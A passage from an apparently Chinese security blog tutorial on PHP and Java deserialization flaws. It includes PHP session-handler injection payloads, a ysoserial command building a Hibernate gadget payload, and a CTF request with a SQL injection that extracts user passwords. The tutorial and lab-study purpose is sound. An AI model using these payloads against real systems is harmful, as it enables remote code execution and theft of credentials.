session，而产生了一个键值，该键值由 <code>ini.get(&quot;session.upload_progress.prefix&quot;)+我们构造的session.upload_progress.name</code> 一起组成，最终写入 <code>sess_文件</code> li里。</p><p>linux 下，session文件一般的默认存储位置是 <code>/tmp 或 /var/lib/php/session</code></p></li></ul></li><li><p>避免 <code>session.upload_progress.cleanup=on</code> 的干扰</p><p>该选项导致文件成功上传之后，一旦读取 POST 信息之后，会清除进度信息，session 文件将会被立即清理。重点是 该选项默认开启。</p><ul><li>方法：<strong>条件竞争</strong></li></ul></li></ul><p><strong>当 session.auto_start＝On 时：</strong></p><p>如果 session.auto_start＝On ，就会自动注册 session 会话，因为该过程是发生在脚本代码执行前，所以在脚本中设定的包括序列化处理器在内的 session 相关配选项的设置是不起作用的，因此我们需要 <strong>在脚本中设置 序列化处理器配置的程序会在 session.auto_start＝On 时，销毁自动生成的 Session 会话</strong>，然后再设置需要的序列化处理器，那么第一次我们所使用的就是我们自己设置的存储器，而第二次执行时，系统仍会自动调用 session_start() 函数注册会话，这时所使用的就是默认的存储引擎了。</p><p>所以，如果脚本中设置的序列化处理器与 php.ini 中设置的不同，就会出现安全问题，如下面的代码：</p><p>已知：默认的存储引擎是 php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (ini_get(<span class="string">&#x27;session.auto_start&#x27;</span>)) &#123;</span><br><span class="line">    session_destroy();</span><br><span class="line">&#125;</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;a&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br></pre></td></tr></table></figure><p>第一次访问脚本 ，传入参数 <code>?a=|O:8:&quot;stdClass&quot;:0:&#123;&#125;</code>，脚本将会按照 php_serialize 处理数据，得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:1:&quot;a&quot;;s:20:&quot;|O:8:&quot;stdClass&quot;:0:&#123;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>第二次访问，PHP 会按照 php.ini 里设置的序列化处理器反序列化存储的数据，这时如果 php.ini 里设置的是 php 处理器的话，将会反序列化伪造的数据，成功实例化了 stdClass 对象：）。</p><p><strong>当 session.auto_start＝Off 时：</strong></p><p>两个脚本注册 Session 会话时使用的序列化处理器不同，就会出现安全问题，如下面的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//foo1.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;a&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//foo2.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="comment">//or session.serialize_handler set to php in php.ini </span></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span> </span>&#123;</span><br><span class="line"><span class="keyword">var</span> <span class="variable">$hi</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;hi&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;hi;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问 foo1.php 提交数据 ?a=|O:1:”a”:1:{s:2:”hi”;s:7:”success”;}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:1:&quot;a&quot;;s:36:&quot;|O:1:&quot;a&quot;:1:&#123;s:2:&quot;hi&quot;;s:7:&quot;success&quot;;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>再访问 foo2.php ，成功</p><p><img src="https://i.loli.net/2021/09/12/9BrpshRMXJCjGUz.png" alt="image-20210912112309204"></p><p>由于 访问 foo1 时，传入的数据将会使用 php_serialize 进行序列化，然后再访问 foo2 时，程序将会使用 php 引擎来反序列化 session 中是之举，从而实例化 a 对象，而执行其中的魔术方法。</p><p><strong>补充：</strong></p><p>为什么在 解析 session 文件时为什么在解析session文件时直接对’|’后的值进行反序列化处理，这也是处理器的功能？这个其实是因为session_start()这个函数，可以看下官方说明：</p><blockquote><p>当会话自动开始或者通过 session_start() 手动开始的时候， PHP 内部会调用会话管理器的 open 和 read 回调函数。 会话管理器可能是 PHP 默认的， 也可能是扩展提供的（SQLite 或者 Memcached 扩展）， 也可能是通过 session_set_save_handler() 设定的用户自定义会话管理器。 通过 read 回调函数返回的现有会话数据（使用特殊的序列化格式存储），PHP 会自动反序列化数据并且填充 $_SESSION 超级全局变量</p></blockquote><h3 id="3-6-4-CTF-题目"><a href="#3-6-4-CTF-题目" class="headerlink" title="3.6.4 CTF 题目"></a>3.6.4 CTF 题目</h3><h1 id="速查"><a href="#速查" class="headerlink" title="速查"></a>速查</h1><ul><li><p>序列化后的结果是一串字符串。</p></li><li><p>反序列化会解开序列化的字符串生成相应类型的数据。</p></li></ul><p>如下代码示例，img是一个数组，下标分别是one和two，对应的值分别是flag,test。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$img[&#x27;one&#x27;] = &quot;flag&quot;;</span><br><span class="line">$img[&#x27;two&#x27;] = &quot;test&quot;;</span><br><span class="line">$a = serialize($img);</span><br><span class="line">var_dump($a);</span><br><span class="line">#输出: string(48) &quot;a:2:&#123;s:3:&quot;one&quot;;s:4:&quot;flag&quot;;s:3:&quot;two&quot;;s:4:&quot;test&quot;;&#125;&quot;</span><br><span class="line"></span><br><span class="line">$b = unserialize($a);</span><br><span class="line">var_dump($b);</span><br><span class="line">/*输出如下内容:</span><br><span class="line">array(2) &#123;</span><br><span class="line">  [&quot;one&quot;]=&gt;</span><br><span class="line">  string(4) &quot;flag&quot;</span><br><span class="line">  [&quot;two&quot;]=&gt;</span><br><span class="line">  string(4) &quot;test&quot;</span><br><span class="line">&#125;</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><p><strong>序列化部分</strong>:</p><p>经过serialize序列化后生成了相应的字符串: a:2:{s:3:”one”;s:4:”flag”;s:3:”two”;s:4:”test”;}</p><p>a表示数组 , a:2中的2表示有两个键值，即对应的one、two两组键值对。</p><p>花括号中的s都表示string即字符串，</p><p>s:后面的值分别是3、4、3、4,即对应的字符串长度，比如one长度是三，flag长度是4</p><p><strong>反序列化部分:</strong></p><p>unserialize函数将字符串解序列化，我们用var_dump函数显示了他的详细信息。</p><p>可见解序列化后由变量$b，接收了img数组。</p><h3 id="序列化中每个字母的表示"><a href="#序列化中每个字母的表示" class="headerlink" title="序列化中每个字母的表示"></a>序列化中每个字母的表示</h3><table><thead><tr><th align="left">a</th><th align="left">array数组</th></tr></thead><tbody><tr><td align="left">b</td><td align="left">boolean判断类型</td></tr><tr><td align="left">d</td><td align="left">double浮点数</td></tr><tr><td align="left">i</td><td align="left">integer整数型</td></tr><tr><td align="left">o</td><td align="left">common object 一般的对象</td></tr><tr><td align="left">r</td><td align="left">reference引用类型</td></tr><tr><td align="left">s</td><td align="left">string字符串类型</td></tr><tr><td align="left">C</td><td align="left">custom object</td></tr><tr><td align="left">O</td><td align="left">class</td></tr><tr><td align="left">N</td><td align="left">null</td></tr><tr><td align="left">R</td><td align="left">pointer reference</td></tr><tr><td align="left">U</td><td align="left">unicode string</td></tr></tbody></table><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() //使用unserialize时触发 </span><br><span class="line">__sleep() //使用serialize时触发 </span><br><span class="line">__destruct() //对象被销毁时触发</span><br><span class="line">__call()    //在对象上下文中调用不可访问的方法时触发——对象调用一个没有声明的方法时，触发 </span><br><span class="line">__callStatic() //在静态上下文中调用不可访问的方法时触发 </span><br><span class="line">__get() //用于从不可访问的属性读取数据 </span><br><span class="line">__set() //用于将数据写入不可访问的属性 </span><br><span class="line">__isset() //在不可访问的属性上调用isset()或empty()触发 </span><br><span class="line">__unset() //在不可访问的属性上使用<span class="built_in">unset</span>()时触发</span><br><span class="line">__toString() //把类当作字符串使用时触发 <span class="built_in">echo</span> 对象; <span class="variable">$text</span>=<span class="variable">$test</span>+$对象； </span><br><span class="line">__invoke() //当尝试以调用函数的方式调用一个对象时，该方法会被自动调用</span><br></pre></td></tr></table></figure><h2 id="1-3-危害"><a href="#1-3-危害" class="headerlink" title="1.3 危害"></a>1.3 危害</h2><p>SQL注入</p><p>代码执行</p><p>目录遍历</p><h1 id="四、JAVA-反序列化"><a href="#四、JAVA-反序列化" class="headerlink" title="四、JAVA 反序列化"></a>四、JAVA 反序列化</h1><p>序列化：将对象的状态信息转换为可以存储或者传输的形式的过程。序列化期间，对象将其当前的状态写入到临时或持久型储存区。</p><p>反序列化：从储存区读取到数据，将其还原为对象</p><p><strong>好处：</strong></p><ul><li>把对象的字节序列永久地保存到硬盘上，实现对象的持久化，通常存放在一个文件中；</li><li>利用序列化实现远程通信，即在网络上传递对象的字节序列。</li></ul><p><strong>实例理解</strong></p><blockquote><p>Web 服务器中的 Session 会话对象，当有10万用户并发访问，就有可能出现10万个 Session 对象，显然这种情况内存可能是吃不消的。</p><p>于是 Web 容器就会把一些 Session 先序列化，让他们离开内存空间，序列化到硬盘中，当需要调用时，再把保存在硬盘中的对象还原到内存中。</p><hr><p>我们知道，当两个进程进行远程通信时，彼此可以发送各种类型的数据，包括文本、图片、音频、视频等， 而这些数据都会以二进制序列的形式在网络上传送。</p><p>同样的序列化与反序列化则实现了 <strong>进程通信间的对象传送</strong>，发送方需要把这个Java对象转换为字节序列，才能在网络上传送；接收方则需要把字节序列再恢复为Java对象。</p></blockquote><p><strong>JDK 类库中序列化 API</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//序列化:对参数指定的obj对象进行序列化，将字节序列写入到一个目标输出流中</span></span><br><span class="line">ObjectOutputStream类 writeObject()</span><br><span class="line"><span class="comment">//反序列化:从一个源输入流中读取字节序列，把他们反序列化为一个对象，将其返回</span></span><br><span class="line">ObjectIntputStream类 readObject()</span><br></pre></td></tr></table></figure><p><strong>工具</strong>    <a href="https://github.com/frohoff/ysoserial/releases">https://github.com/frohoff/ysoserial/releases</a></p><p><strong>WebGoat</strong>    <a href="https://github.com/WebGoat/WebGoat/releases">https://github.com/WebGoat/WebGoat/releases</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker pull webgoat/webgoat-8.0</span><br><span class="line">docker images</span><br><span class="line">docker run -p 8080:8080 -t webgoat/webgoat-8.0</span><br><span class="line">http://192.168.158.111:8080/WebGoat/login</span><br></pre></td></tr></table></figure><h2 id="4-1-WebGoat"><a href="#4-1-WebGoat" class="headerlink" title="4.1 WebGoat"></a>4.1 WebGoat</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rO0ABXQAVklmIHlvdSBkZXNlcmlhbGl6ZSBtZSBkb3duLCBJIHNoYWxsIGJlY29tZSBtb3JlIHBvd2VyZnVsIHRoYW4geW91IGNhbiBwb3NzaWJseSBpbWFnaW5l</span><br><span class="line">即序列化+base64加密</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/15/bMn8ex1dK7QRVPD.png" alt="image-20210504171938337"></p><p><strong>命令执行 + 反弹 shell(以免不会回显)</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#思路:以 执行 ipconfig 命令为例</span></span><br><span class="line">ipconfig --&gt; 序列化 --&gt; base64加密 --&gt; 最终转换成以rO0AB格式开头的字符串作为我们的payload</span><br></pre></td></tr></table></figure><p><strong>工具形成 payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Dhibernate5 -cp hibernate-core-5.4.9.Final.jar;ysoserial-master-30099844c6-1.jar ysoserial.GeneratePayload Hibernatel calc.exe &gt; payload.bin</span><br></pre></td></tr></table></figure><p>再将生成的 payload.bin 进行一个base64加密：使用python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">c = <span class="built_in">open</span>(<span class="string">&quot;payload.bin路径&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">cc = base64.urlsafe_b64encode(c)</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&quot;payload.txt&quot;</span>,<span class="string">&quot;wt&quot;</span>,ecoding=<span class="string">&quot;utf-8&quot;</span>).write(cc.decode())</span><br></pre></td></tr></table></figure><h2 id="4-2-CTFHUB-—-think-java"><a href="#4-2-CTFHUB-—-think-java" class="headerlink" title="4.2 CTFHUB —- think_java"></a>4.2 CTFHUB —- think_java</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /common/test/sqlDict HTTP/1.1</span><br><span class="line">Host: challenge-516f101de06176a6.sandbox.ctfhub.com:10080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line"></span><br><span class="line">dbName=myapp?a=&#x27; union select (select pwd from user)#</span><br></pre></td></tr></table></figure><p>SQL注入获取用户账号吗和密码</p><p>登陆成功</p><p>对方回显数据：一段 ro0AB开头的数据</p><p>先进行base64解密</p><p>使用serializationDumper工具进行解析反序列话的数据</p><p>java -jar SerializationDumper.jar base64</p><p><img src="https://i.loli.net/2021/09/15/jJ5y4FCiGpXvRWZ.png" alt="image-20210504180422065"></p><p><a href="https://www.cnblogs.com/20175211lyz/p/11403397.html">https://www.cnblogs.com/20175211lyz/p/11403397.html</a></p><p><a href="https://www.cnblogs.com/niceyoo/p/10596657.html">https://www.cnblogs.com/niceyoo/p/10596657.html</a></p><p><img src="https://i.loli.net/2021/09/15/3iUZ8msAvRtHIjb.png" alt="image-20210504155703612"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="WEB漏洞详解" scheme="https://xizhi-future.github.io/categories/WEB%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/"/>
    
    
    <category term="序列化与反序列化" scheme="https://xizhi-future.github.io/tags/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
</feed>
